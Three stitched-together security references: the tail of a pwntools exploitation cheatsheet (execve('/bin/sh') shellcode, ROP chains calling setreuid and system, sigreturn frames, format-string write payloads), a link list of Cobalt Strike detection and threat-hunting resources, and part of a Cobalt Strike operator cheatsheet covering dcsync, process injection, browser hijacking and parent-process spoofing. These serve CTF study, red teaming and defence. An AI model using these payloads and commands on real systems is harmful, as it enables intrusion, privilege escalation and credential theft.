cyclic(16, n=8)  # = b'aaaaaaaabaaaaaaa'

cyclic_find(0x61616164)               # = 12
cyclic_find(0x6161616161616162, n=8)  # = 8
```

```py
# you can also print hexdumps of byte strings
print(hexdump(data))

'''
00000000  65 4c b6 62  da 4f 1d 1b  d8 44 a6 59  a3 e8 69 2c  │eL·b│·O··│·D·Y│··i,│
00000010  09 d8 1c f2  9b 4a 9e 94  14 2b 55 7c  4e a8 52 a5  │····│·J··│·+U|│N·R·│
00000020
'''
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="assembly-and-shellcraft"></a>
## 5. Assembly and Shellcraft

The shellcraft module is massive, so maybe just [read the documentation](https://pwntools.readthedocs.io/en/latest/shellcraft.html).

```py
# you can write shellcode using the `asm` function
shellcode = asm('''
execve:
    lea rdi, [rip+bin_sh]
    mov rsi, 0
    mov rdx, 0
    mov rax, SYS_execve
    syscall
bin_sh:
    .string "/bin/sh"
''')

# assembly needs to be converted into bytes in order
# to be sent as part of a payload
payload = bytes(shellcode)
```

```py
# here's some assembly for a basic `execve("/bin/sh")` shellcode
shellcode = asm('''
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, SYS_execve
syscall
''')

# another way to represent this would be to use pwntools' shellcraft
# module, of which there are so many ways to do so
shellcode = shellcraft.pushstr('/bin/sh')
shellcode += shellcraft.syscall('SYS_execve', 'rsp', 0, 0)

payload = bytes(asm(shellcode))
```

```py
# or maybe you can just use pwntools' `sh` template
shellcode = shellcraft.sh()
payload = bytes(asm(shellcode))
```

```py
# you can also use gdb to debug shellcode
shellcode = '''
execve:
    lea rdi, [rip+bin_sh]
    mov rsi, 0
    mov rdx, 0
    mov rax, SYS_execve
    syscall
bin_sh:
    .string "/bin/sh"
'''

# converting the shellcode we wrote to an elf
elf = ELF.from_assembly(shellcode)
p = gdb.debug(elf.path)
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="elfs-strings-and-symbols"></a>
## 6. ELFs, Strings and Symbols

```py
# `ELF` objects are instantiated by providing a file name
elf = ELF('./target')
```

```py
# accessing symbols via location
elf.plt  # contains all symbols located in the PLT
elf.got  # contains all symbols located in the GOT

# elf.sym contains all known symbols, with preference
# given to the PLT over the GOT
elf.sym

# e.g. getting the address of the `puts` function
puts = elf.plt.puts  # equivalent to elf.sym['puts']
```

```py
libc = ELF('./libc.so.6')

old_puts = libc.sym.puts  # = 0x875a0

# you can modify the base address of the elf by setting its
# address parameter
libc.address = 0xdeadbeef000

# symbol locations will now be calculated relative to that
# base address provided
new_puts = libc.sym.puts  # 0xdeadbf765a0 = 0xdeadbeef + 0x875a0
```

```py
libc = ELF('./libc.so.6')

# you can even find strings in elf files with the `search` function
bin_sh = next(elf.search(b'/bin/sh'))
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="return-oriented-programming"></a>
## 7. Return Oriented Programming

```py
# `ROP` objects are instantiated using an `ELF` object
elf = ELF('./target')
rop = ROP(elf)
```

```py
# specific gadgets can be found using the `find_gadget` function
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
syscall = rop.find_gadget(['syscall', 'ret']).address

# another alternative for simple `pop reg; ret` gadgets
pop_rdi = rop.rdi.address
pop_rsi = rop.rsi.address
```

```py
pop_rax = 0xdeadbeef
syscall = 0xcafebabe

# the below is equivalent to `p64(pop_rax) + p64(59) + p64(syscall)`,
# when converted to bytes
rop.raw(pop_rax)
rop.raw(59)
rop.raw(syscall)
```

```py
rop.call(elf.sym.puts, [0xdeadbeef])

# the above `call` function is equivalent to
rop.raw(rop.rdi.address)  # pop rdi; ret
rop.raw(0xdeadbeef)
rop.raw(elf.sym.puts)
```

```py
# rop chains can also be built on top of libc, rather than your
# target binary
libc = ELF('./libc.so.6')
libc.address = 0xdeadbeef  # setting the base address of libc

bin_sh = next(libc.search(b'/bin/sh'))

# note that this rop chain will use gadgets found in libc
rop = ROP(libc)

# you can also directly call elf symbols (if they're available in) 
# the elf) instead of using pwntools' `call` function
rop.setreuid(0, 0)  # equivalent to rop.call(libc.setreuid, [0, 0])
rop.system(bin_sh)  # equivalent to rop.call(libc.system, [bin_sh])
```

```py
# converting the rop chain to bytes in order to send it as
# a payload
payload = rop.chain()
```

```py
# printing the rop chain generated by pwn tools
print(rop.dump())
```

[^ Back to top](#file-pwntools-cheatsheet-md)

<a name="srop-and-sigreturn-frames"></a>
## 8. SROP and Sigreturn Frames

```py
# address of a syscall instruction
syscall = 0xdeadbeef

# address of a "/bin/sh" string
bin_sh = 0xcafebabe

# instatiating a sigreturn frame object
frame = SigreturnFrame()

# setting values of registers (set rip as address to return to)
frame.rax = constants.SYS_execve
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
```

```py
# the sigreturn frame will need to be converted to bytes prior
# to being sent as part of a payload
payload = bytes(frame)
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="format-string-exploits"></a>
## 9. Format String Exploits

```py
# the format string offset
offset = 5

# the writes you want to perform
writes = {
    0x40010: 0xdeadbeef,  # write 0xdeadbeef at 0x40010
    0x40018: 0xcafebabe   # write 0xcafebabe at 0x40018
}

# you can use the `fmtstr_payload` function to automatically
# generate a payload that performs the writes you specify
payload = fmtstr_payload(offset, writes)
p.writeline(payload)
```

```py
# if data is written by the vulnerable function at the start of
# your payload, you can specify the number of bytes written
payload = fmtstr_payload(offset, writes, numbwritten=8)
p.writeline(payload)
```

```py
p = process('./target')

# you will need to define a function that sends your payload to
# the target, and returns the value output by the target
def send_data(payload):
    p.sendline(payload)
    return p.readall()

# automatic calculation of the format string offset
fmt_str = FmtStr(execute_fmt=send_data)
offset = fmt_str.offset
```

```py
# you can also use the `FmtStr` object to perform your writes
fmt_str = FmtStr(execute_fmt=send_data)
fmt_str.write(0x40010, 0xdeadbeef)  # write 0xdeadbeef at 0x40010
fmt_str.write(0x40018, 0xcafebabe)  # write 0xcafebabe at 0x40018
fmt_str.execute_writes()
```










# Awesome-CobaltStrike-Resources
<strong>Cobalt Strike is a commercial, full-featured, penetration testing tool which bills itself as "adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors". Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.
In addition to its own capabilities, Cobalt Strike leverages the capabilities of other well-known tools such as Metasploit and Mimikatz. <strong>


Cobalt Strike MITRE TTPs </br>
https://attack.mitre.org/software/S0154/

Cobalt Strike MITRE ATT&CK Navigator </br>
https://mitre-attack.github.io/attack-navigator//#layerURL=https%3A%2F%2Fattack.mitre.org%2Fsoftware%2FS0154%2FS0154-enterprise-layer.json

<h2>Hunting & Detection Tools</br></h2>

Hunt-Sleeping-Beacons</br>
https://github.com/thefLink/Hunt-Sleeping-Beacons

Pointer - Cobalt Strike Hunting</br>
https://github.com/shabarkin/pointer

BeaconEye</br>
https://github.com/CCob/BeaconEye

Beacon Hunter</br>
https://github.com/3lp4tr0n/BeaconHunter

Cobalt Spam</br>
https://github.com/hariomenkel/CobaltSpam

Cobalt Strike Team Server Password Brute Forcer </br>
https://github.com/isafe/cobaltstrike_brute

CobaltStrikeScan Scan files or process memory for Cobalt Strike beacons and parse their configuration </br>
https://github.com/Apr4h/CobaltStrikeScan

Cobalt Strike beacon scan </br>
https://github.com/whickey-r7/grab_beacon_config

Cobalt Strike decrypt</br>
https://github.com/WBGlIl/CS_Decrypt

Detecting CobaltStrike for Volatility<br>
https://github.com/JPCERTCC/aa-tools/blob/master/cobaltstrikescan.py

JARM fingerprints scanner </br>
https://github.com/salesforce/jarm

Cobalt Strike Forensic</br>
https://github.com/RomanEmelyanov/CobaltStrikeForensic

Cobalt Strike resources</br>
https://github.com/Te-k/cobaltstrike

List of C2 JARM including Cobalt Strike</br>
https://github.com/cedowens/C2-JARM

SilasCutler_JARM_Scan_CobaltStrike_Beacon_Config.json </br>
https://pastebin.com/DzsPgH9w


Detection Cobalt Strike stomp</br>
https://github.com/slaeryan/DetectCobaltStomp

Cobalt Strike Built-In Lateral Movement Capabilities Based On CONTI Leak Mind Map
https://github.com/AndrewRathbun/DFIRMindMaps/tree/main/OSArtifacts/Windows/Cobalt%20Strike%20Lateral%20Movement%20Artifact%20-%20Based%20on%20CONTI%20Leak

ThreatHunting Jupyter Notebooks - Notes on Detecting Cobalt Strike Activity</br>
https://github.com/BinaryDefense/ThreatHuntingJupyterNotebooks/blob/main/Cobalt-Strike-detection-notes.md

Random C2 Profile Generator</br>
https://github.com/threatexpress/random_c2_profile

Python parser for CobaltStrike Beacon's configuration</br>
https://github.com/Sentinel-One/CobaltStrikeParser

<h2>Yara rules</br></h2>
Cobalt Strike Yara</br>
https://github.com/Neo23x0/signature-base/blob/master/yara/apt_cobaltstrike.yar</br>
https://github.com/Neo23x0/signature-base/blob/master/yara/apt_cobaltstrike_evasive.yar</br>
https://github.com/Te-k/cobaltstrike/blob/master/rules.yar

<h2>Sigma rules</br></h2>
Cobalt Strike sigma rules</br>
Sigma is a generic and open signature format that allows you to describe relevant log events in a straightforward manner.</br>
https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_meterpreter_or_cobaltstrike_getsystem_service_start.yml</br>
https://github.com/SigmaHQ/sigma/blob/master/rules/windows/create_remote_thread/sysmon_cobaltstrike_process_injection.yml</br>
https://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/sysmon_mal_cobaltstrike.yml</br>
https://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/sysmon_mal_cobaltstrike_re.yml</br>
https://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/sysmon_susp_cobaltstrike_pipe_patterns.yml</br>
https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_cobaltstrike_service_installs.yml</br>
https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry_event/sysmon_cobaltstrike_service_installs.yml</br>
https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/sysmon_cobaltstrike_bof_injection_pattern.yml</br>
https://github.com/SigmaHQ/sigma/blob/master/rules/network/net_mal_dns_cobaltstrike.yml</br>
https://github.com/SigmaHQ/sigma/blob/master/rules/network/zeek/zeek_default_cobalt_strike_certificate.yml</br>
https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/sysmon_direct_syscall_ntopenprocess.yml</br>
https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/process_creation_cobaltstrike_load_by_rundll32.yml</br>
https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_rundll32_no_params.yml</br>
https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_cobaltstrike_process_patterns.yml</br>
https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file_event/sysmon_susp_clr_logs.yml</br>
(check in the future for updates or new rules)

<h2>Indicators of compromise</br></h2>

Cobalt Strike hashes</br>
https://bazaar.abuse.ch/browse/yara/CobaltStrike/

https://bazaar.abuse.ch/browse/tag/CobaltStrike/

https://bazaar.abuse.ch/browse/tag/CobaltStrike%20beacon%20implant%20Zoom%20Meetings/

https://tria.ge/s?q=family%3Acobaltstrike

Possible Cobalt Strike Stager IOCs</br>
https://pastebin.com/54zE6cSj


List of Cobalt Strike servers
https://docs.google.com/spreadsheets/d/1bYvBh6NkNYGstfQWnT5n7cSxdhjSn1mduX8cziWSGrw/edit#gid=766378683

Possible Cobalt Strike ioc's</br>
https://pastebin.com/u/cobaltstrikemonitor

Cobalt Strike Trevor Profiles</br>
https://pastebin.com/yB6RJ63F

https://pastebin.com/7QnLN5u0

Cobalt Strike & Metasploit servers</br>
https://gist.github.com/MichaelKoczwara</br>

ThreatFox Database(Cobalt Strike)by abuse.ch</br>
https://threatfox.abuse.ch/browse/malware/win.cobalt_strike/

<h2>Hunting & Detection Research Articles</br></h2>

Cobalt Strike as a Threat to Healthcare from U.S. Department of Health & Human Services - Health Sector Cybersecurity Coordination Center (HC3)</br>
https://www.hhs.gov/sites/default/files/cobalt-strike-tlpwhite.pdf

Detecting Conti Cobalt Strike Lateral Movement Techniques Part 1</br>
https://www.unh4ck.com/detection-engineering-and-threat-hunting/lateral-movement/detecting-conti-cobaltstrike-lateral-movement-techniques-part-1

Detecting Conti Cobalt Strike Lateral Movement Techniques Part 2</br>
https://www.unh4ck.com/detection-engineering-and-threat-hunting/lateral-movement/detecting-conti-cobaltstrike-lateral-movement-techniques-part-2

CobaltStrike Beacon Config Parsing with CyberChef — Malware Mondays #2</br>
https://medium.com/@whickey000/cobaltstrike-beacon-config-parsing-with-cyberchef-malware-mondays-2-86d759b9a031

Cobalt Strike Hunting – Key items to look for<br>
https://www.vanimpe.eu/2021/09/12/cobalt-strike-hunting-key-items-to-look-for/

Identify malicious servers / Cobalt Strike servers with JARM</br>
https://www.vanimpe.eu/2021/09/14/identify-malicious-servers-cobalt-strike-servers-with-jarm/

Full-Spectrum Cobalt Strike Detection</br>
https://go.recordedfuture.com/hubfs/reports/mtp-2021-0914.pdf

Cobalt Strike, a Defender’s Guide</br>
https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/

Cobalt Strike, a Defender’s Guide – Part 2</br>
https://thedfirreport.com/2022/01/24/cobalt-strike-a-defenders-guide-part-2/

BazarCall to Conti Ransomware via Trickbot and Cobalt Strike</br>
https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/

Cobalt Strike and Tradecraft</br>
https://hausec.com/2021/07/26/cobalt-strike-and-tradecraft/

Analysing Cobalt Strike for fun and profit</br>
https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/

Cobalt Strike Remote Threads detection</br>
https://medium.com/@olafhartong/cobalt-strike-remote-threads-detection-206372d11d0f
https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_cobaltstrike_process_injection.yml

The art and science of detecting Cobalt Strike</br>
https://talos-intelligence-site.s3.amazonaws.com/production/document_files/files/000/095/031/original/Talos_Cobalt_Strike.pdf

Detecting Cobalt Strike Default Modules via Named Pipe Analysis</br>
https://labs.f-secure.com/blog/detecting-cobalt-strike-default-modules-via-named-pipe-analysis/

A Multi-Method Approach to Identifying Rogue Cobalt Strike Servers</br>
https://go.recordedfuture.com/hubfs/reports/cta-2019-0618.pdf

How to detect Cobalt Strike activities in memory forensics</br>
https://www.andreafortuna.org/2020/11/22/how-to-detect-cobalt-strike-activity-in-memory-forensics/

Detecting Cobalt Strike by Fingerprinting Imageload Events</br>
https://redhead0ntherun.medium.com/detecting-cobalt-strike-by-fingerprinting-imageload-events-6c932185d67c

The Anatomy of an APT Attack and CobaltStrike Beacon’s Encoded Configuration </br>
https://labs.sentinelone.com/the-anatomy-of-an-apt-attack-and-cobaltstrike-beacons-encoded-configuration/

CobaltStrike - beacon.dll : Your No Ordinary MZ Header</br>
https://tccontre.blogspot.com/2019/11/cobaltstrike-beacondll-your-not.html

GitHub-hosted malware calculates Cobalt Strike payload from Imgur pic</br>
https://www.bleepingcomputer.com/news/security/github-hosted-malware-calculates-cobalt-strike-payload-from-imgur-pic/

Detecting Cobalt Strike beacons in NetFlow data</br>
https://delaat.net/rp/2019-2020/p29/report.pdf

Volatility Plugin for Detecting Cobalt Strike Beacon</br>
https://blogs.jpcert.or.jp/en/2018/08/volatility-plugin-for-detecting-cobalt-strike-beacon.html

Easily Identify Malicious Servers on the Internet with JARM</br>
https://engineering.salesforce.com/easily-identify-malicious-servers-on-the-internet-with-jarm-e095edac525a

Cobalt Strike Beacon Analysis</br>
https://isc.sans.edu/forums/diary/Quick+Tip+Cobalt+Strike+Beacon+Analysis/26818/

Hancitor infection with Pony, Evil Pony, Ursnif, and Cobalt Strike</br>
https://isc.sans.edu/forums/diary/Hancitor+infection+with+Pony+Evil+Pony+Ursnif+and+Cobalt+Strike/25532/

Attackers Exploiting WebLogic Servers via CVE-2020-14882 to install Cobalt Strike</br>
https://isc.sans.edu/forums/diary/Attackers+Exploiting+WebLogic+Servers+via+CVE202014882+to+install+Cobalt+Strike/26752/

Hiding in the Cloud: Cobalt Strike Beacon C2 using Amazon APIs</br>
https://rhinosecuritylabs.com/aws/hiding-cloudcobalt-strike-beacon-c2-using-amazon-apis/

Identifying Cobalt Strike team servers in the wild</br>
https://blog.fox-it.com/2019/02/26/identifying-cobalt-strike-team-servers-in-the-wild/

Multi-stage APT attack drops Cobalt Strike using Malleable C2 feature</br>
https://blog.malwarebytes.com/threat-analysis/2020/06/multi-stage-apt-attack-drops-cobalt-strike-using-malleable-c2-feature/

Operation Cobalt Kitty</br>
http://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf

Detecting and Advancing In-Memory .NET Tradecraft</br>
https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/

Analysing Fileless Malware: Cobalt Strike Beacon</br>
https://newtonpaul.com/analysing-fileless-malware-cobalt-strike-beacon/ </br>
CobaltStrike samples pass=infected</br>
https://www.dropbox.com/s/o5493msqarg3iyu/Cobalt%20Strike.7z?dl=0 

IndigoDrop spreads via military-themed lures to deliver Cobalt Strike</br>
https://blog.talosintelligence.com/2020/06/indigodrop-maldocs-cobalt-strike.html

Cobalt Group Returns To Kazakhstan</br>
https://research.checkpoint.com/2019/cobalt-group-returns-to-kazakhstan/

Striking Back at Retired Cobalt Strike: A look at a legacy vulnerability</br>
https://research.nccgroup.com/2020/06/15/striking-back-at-retired-cobalt-strike-a-look-at-a-legacy-vulnerability/

Azure Sentinel Quick-Deploy with Cyb3rWard0g’s Sentinel To-Go – Let’s Catch Cobalt Strike! </br>
https://www.blackhillsinfosec.com/azure-sentinel-quick-deploy-with-cyb3rward0gs-sentinel-to-go-lets-catch-cobalt-strike/

Cobalt Strike stagers used by FIN6</br>
https://malwarelab.eu/posts/fin6-cobalt-strike/

Malleable C2 Profiles and You</br>
https://haggis-m.medium.com/malleable-c2-profiles-and-you-7c7ab43e7929</br>
List of spawns from exposed Cobalt Strike C2</br>
https://gist.github.com/MHaggis/bdcd0e6d5c727e5b297a3e69e6c52286

C2 Traffic patterns including Cobalt Strike</br>
https://marcoramilli.com/2021/01/09/c2-traffic-patterns-personal-notes/

CobaltStrike Threat Hunting via named Pipes</br>
https://www.linkedin.com/feed/update/urn:li:activity:6763777992985518081/

Hunting for GetSystem in offensive security tools</br>
https://redcanary.com/blog/getsystem-offsec/

Hunting and Detecting Cobalt Strike</br>
https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/

Detecting Cobalt Strike with memory signatures</br>
https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures

How to detect CobaltStrike Command & Control communication</br>
https://underdefense.com/how-to-detect-cobaltstrike-command-control-communication/

Red Canary Threat Detection Report 2021 - Cobalt Strike</br>
https://redcanary.com/threat-detection-report/threats/cobalt-strike/


Detecting Exposed Cobalt Strike DNS Redirectors</br>
https://labs.f-secure.com/blog/detecting-exposed-cobalt-strike-dns-redirectors/

Decoding Cobalt Strike Traffic</br>
https://isc.sans.edu/diary/27322

Anatomy of Cobalt Strike’s DLL Stager</br>
https://blog.nviso.eu/2021/04/26/anatomy-of-cobalt-strike-dll-stagers/

malleable_c2_profiles</br>
https://gist.github.com/MHaggis/6c600e524045a6d49c35291a21e10752

pipes</br>
https://gist.github.com/MHaggis/6c600e524045a6d49c35291a21e10752#gistcomment-3624664

spawnto</br>
https://gist.github.com/MHaggis/6c600e524045a6d49c35291a21e10752#gistcomment-3624663

Enterprise Scale Threat Hunting: C2 Beacon Detection with Unsupervised ML and KQL</br>
Part 1</br>
https://mergene.medium.com/enterprise-scale-threat-hunting-network-beacon-detection-with-unsupervised-machine-learning-and-277c4c30304f<br>
Part 2</br>
https://mergene.medium.com/enterprise-scale-threat-hunting-network-beacon-detection-with-unsupervised-ml-and-kql-part-2-bff46cfc1e7e

Detecting network beacons via KQL using simple spread stats functions<br>
https://ateixei.medium.com/detecting-network-beacons-via-kql-using-simple-spread-stats-functions-c2f031b0736b

Cobalt Strike Hunting — simple PCAP and Beacon Analysis</br>
https://michaelkoczwara.medium.com/cobalt-strike-hunting-simple-pcap-and-beacon-analysis-f51c36ce6811

Guide to Named Pipes and Hunting for Cobalt Strike Pipes</br>
https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575

Detecting C&C Malleable Profiles</br>
https://community.rsa.com/t5/netwitness-blog/detecting-c-amp-c-malleable-profiles/ba-p/607072

FIN12: The Prolific Ransomware Intrusion Threat Actor That Has Aggressively Pursued Healthcare Targets</br>
The report itself is not about Cobalt Strike, but FIN12 makes heavy use of the CS. We have a whole section about it in the report: "Cobalt Strike / BEACON TTPs"</br>
https://www.mandiant.com/media/12596/download

Defining Cobalt Strike Components So You Can BEA-CONfident in Your Analysis</br>
https://www.mandiant.com/resources/defining-cobalt-strike-components

Cobalt Strike: Using Known Private Keys To Decrypt Traffic</br>
https://blog.nviso.eu/2021/10/21/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-1/ (part 1)
https://blog.nviso.eu/2021/10/27/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-2/ (part 2)

Cobalt Strike: Using Process Memory To Decrypt Traffic</br>
https://blog.nviso.eu/2021/11/03/cobalt-strike-using-process-memory-to-decrypt-traffic-part-3/

Cobalt Strike: Decrypting Obfuscated Traffic</br>
https://blog.nviso.eu/2021/11/17/cobalt-strike-decrypting-obfuscated-traffic-part-4/

Cobalt Strike: Decrypting DNS Traffic</br>
https://blog.nviso.eu/2021/11/29/cobalt-strike-decrypting-dns-traffic-part-5/

Decrypting Cobalt Strike Traffic With Keys Extracted From Process Memory</br>
https://isc.sans.edu/diary/28006

Finding Beacons in the Dark: A Guide to Cyber Threat Intelligence</br> 
https://www.blackberry.com/us/en/pdfviewer?file=/content/dam/blackberry-com/asset/enterprise/pdf/direct/sneak-peek-ch1-2-finding-beacons-in-the-dark.pdf

Collecting Cobalt Strike Beacons with the Elastic Stack</br>
https://elastic.github.io/security-research/intelligence/2022/01/02.collecting-cobalt-strike-beacons/article/

Extracting Cobalt Strike Beacon Configurations</br>
https://elastic.github.io/security-research/intelligence/2022/01/03.extracting-cobalt-strike-beacon/article/

<h2>Trainings </br></h2>
Attack detection fundamentals including also Cobalt Strike detection</br>
https://labs.f-secure.com/blog/attack-detection-fundamentals-initial-access-lab-1</br>
https://labs.f-secure.com/blog/attack-detection-fundamentals-initial-access-lab-2</br>
https://labs.f-secure.com/blog/attack-detection-fundamentals-initial-access-lab-3</br>
https://labs.f-secure.com/blog/attack-detection-fundamentals-initial-access-lab-4</br>
https://www.youtube.com/watch?v=DDK_hC90kR8&feature=youtu.beh</br>

Cobalt Strike Detection via Log Analysis Workshop</br>
https://www.sans.org/webcasts/tech-tuesday-workshop-cobalt-strike-detection-log-analysis-119395/

<h2>Videos</br></h2>

Malleable Memory Indicators with Cobalt Strike's Beacon Payload</br>
https://www.youtube.com/watch?v=93GyP-mEUAw&feature=emb_title


STAR Webcast: Spooky RYUKy: The Return of UNC1878</br>
https://www.youtube.com/watch?v=BhjQ6zsCVSc

Excel 4.0 Macros Analysis - Cobalt Strike Shellcode Injection</br>
https://www.youtube.com/watch?v=XnN_UWfHlNM

Profiling And Detecting All Things SSL With JA3<br>
https://www.youtube.com/watch?v=oprPu7UIEuk

Hunting beacons by Bartosz Jerzman (x33fcon conf)<br>
https://www.youtube.com/watch?v=QrSTnVlOIIA

Striking Back: Hunting Cobalt Strike Using Sysmon And Sentinel by Randy Pargman<br>
https://www.binarydefense.com/striking-back-hunting-cobalt-strike-using-sysmon-and-sentinel-thank-you/?submissionGuid=5719f087-bfa5-4261-8b77-34541d8736d6

Making Sense Of Encrypted Cobalt Strike Traffic<br>
https://isc.sans.edu/diary/27448

Cobalt Strike Threat Hunting | SANS DFIR Summit 2021 | Chad Tilbury</br>
https://www.youtube.com/watch?v=borfuQGrB8g

SiegeCast "COBALT STRIKE BASICS" with Tim Medin and Joe Vest</br>
https://www.youtube.com/watch?v=OtM6iegGYAQ

Decrypting Cobalt Strike Traffic With Keys Extracted From Process Memory by Didier Stevens</br>
https://isc.sans.edu/diary/28008

Mining The Shadows with ZoidbergStrike: A Scanner for Cobalt Strike</br>
https://www.youtube.com/watch?v=MWr6bvrrYHQ











# Cobalt Strike CheatSheet

General notes and advices for cobalt strike C2 framework.

## Summary

- [Cobalt Strike CheatSheet](#cobalt-strike-notes)
  - [Summary](#summary)
  - [Basic Menu Explanation](#basic-menu-explanation)
  - [Listeners](#listeners)
  - [Malleable C2 Profiles](#malleable-c2-profiles)
  - [Aggressor Scripts](#aggressor-scripts)
  - [Common Commands](#common-commands)
  - [Exploitation](#exploitation)
  - [Privilege Escalation](#privilege-escalation)
  - [Pivoting](#pivoting)
  - [Lateral Movement](#lateral-movement)
  - [Exflitration](#exflitration)
  - [Miscellaneous](#miscellaneous)
  - [OPSEC Notes](#opsec-notes)
  
## Basic Menu Explanation

- **Cobalt Strike:** The first and most basic menu, it contains the functionality for connecting to a team server, set your preferences, change the view of beacon sessions, manage listeners and aggressor scripts.
- **View:** The view menu consists of elements that manages targets, logs, harvested credentials, screenshots, keystrokes etc. The main purpose of it is to provide an easy way to access the output of many modules, manage your loots and domain targets.
- **Attacks:** This menu contains numerous client side attack generating methods like phishing mails, website cloning and file hosting. Also provides numerous ways to generate your beacon payloads or just generate shellcode and save it for later use on another obfuscation tool.
- **Reporting:** It provides an easy way to generate pdf or spreadsheet files containing information about the execution of an attack, this way it assists you on organizing small reports, making the final report writing process easier.
- **Help:** Basic help menu of the tool.

## Listeners

### Egress Listeners

  - **HTTP/HTTPS:** The most basic payloads for beacon, by default the listeners will listen on ports 80 and 443 with always the option to set custom ports. You have the options to set proxy settings, customize the HTTP header or specify a bind port to redirect beacon's traffic if the infrastructure uses redirector servers for the payload callbacks.
  - **DNS:** A very stealthy payload options, provides stealthier traffic over the dns protocol, you need to specify the DNS server to connect to. The best situation to use this type of listener is in a really locked down environment that blocks even common traffic like port 80 and 443.

### Pivot Listeners

  - **TCP:** A basic tcp listener that bound on a spesific port.
  - **SMB:** An amazing option for internal spread and lateral move, this payload uses named pipes over the smb protocol and is the best approach to bypass firewalls when even default ports like 80 and 443 are black listed.

### Miscellaneous Listeners

  - **Foreign HTTP/HTTPS:** These type of listeners give us the option to pass a session from the metasploit framework to cobalt strike using either http or https payloads. A useful example is to execute an exploit module from metasploit and gain a beacon session on cobalt strike.
  - **External C2:** This is a special type of listener that gives the option to 3rd party applications to act as a communication medium for beacon.

## Malleable C2 Profiles
  In simple words a malleable c2 profile is a configuration file that defines how beacon will communicate and behave when executes    modules, spawns processes and threads, injects dlls or touches disk and memory. Not only that, but it configures how the payload's traffic will look like on a pcap, the communication interval and jitter etc.
  
  The big advantage of custom malleable c2 profiles, is that we can configure and customize our payload to match our situation and target environment, that way we make our selves more stealthy as we can blend with the environment's traffic.
  
## Aggressor Scripts
  Aggressor Script is the scripting language built into Cobalt Strike, version 3.0, and later. Aggresor Script allows you to modify and extend the Cobalt Strike client. These scripts can add additional functions on existing modules or create new ones. \
  [Aggressor Script Tutorial](https://download.cobaltstrike.com/aggressor-script/index.html)
  
## Common Commands
  - **help:** Listing of the available commands.
  - **help \<module>:** Show the help menu of the selected module.
  - **jobs:** List the running jobs of beacon.
  - **jobkill \<id>:** Kill selected job.
  - **run:** Execute OS commands using Win32 API calls.  
  - **shell:** Execute OS commands by spawning "cmd.exe /c".
  - **powershell:** Execute commands by spawning "powershell.exe"
  - **powershell-import:** Import a local powershell module in the current beacon process.
  - **powerpick:** Execute powershell commands without spawning "powershell.exe", using only .net libraries and assemblies. (Bypasses AMSI and CLM)
  - **drives:** List current system drives.
  - **getuid:** Get current user uid.
  - **sleep:** Set the interval and jitter of beacon's call back.
  - **sleep Usage:**
  ```
  sleep [time in seconds] [jitter]
  ```
  i.e.
  ```
  sleep 5 60
  sleep 120 40
  ...
  ```
  - **ps:** Listing processes.
  - **cd:** Change directory.
  - **cp:** Copy a local file on another local location.
  - **download/upload:** Download a file and upload a local file.
  - **download/upload Usage:**
  ```
  download C:\Users\victim\Documents\passwords.csv
  upload C:\Users\S1ckB0y1337\NotMalware\youvebeenhacked.txt
  ```
  - **cancel:** Cancel a file download.
  - **reg:** Query Registry.
  
  
## Exploitation
  - **browserpivot:** Will hijack a web session of internet explorer and make possible for us to browse the web as the victim's browser, including it's sessions, cookies and saved passwords.
  - **dcsync:** Perform the DCsync attack using mimikatz.
  - **dcsync Usage:**
  ```
  dcsync [DOMAIN.fqdn] [DOMAIN\user]
  ```
  i.e.
  ```
  dcsync CORP.local CORP\steve.johnson
  ```
  - **desktop:** Inject a VNC server on the beacon process and get a remote desktop view of the target.
  - **desktop Usage:**
  ```
  desktop [pid] [x86|x64] [high|low]
  ```
  i.e.
  ```
  desktop 592 x64 high
  desktop 8841 x86 low
  ```
  :exclamation: The high/low arguments specify the quality of the session.
  - **dllinject/dllload:** Inject a reflective dll into a process/Load a dll on current process.
  - **execute-assembly:** Loads and executes a .NET compiled assembly executable completely on memory.
  - **execute-assembly Usage:**
  ```
  execute-assembly [/path/to/local/.NET] [arguments]
  ```
  - **inject:** Inject a beacon payload on a specified process and spawn a new beacon session under it's security context.
  - **inject Usage:**
  ```
  inject [pid] [x86|x64] [listener]
  ```
  i.e.
  ```
  inject 9942 x64 Lab-SMB
  inject 429 x86 Lab-HTTPS
  ...
  ```
  - **kerberos\*:** Manipulate kerberos tickets.
  - **ppid:** Spoofs the parent process of beacon for any post-exploitation child spawning job. That way we can hide our malicious post-exploitation jobs.
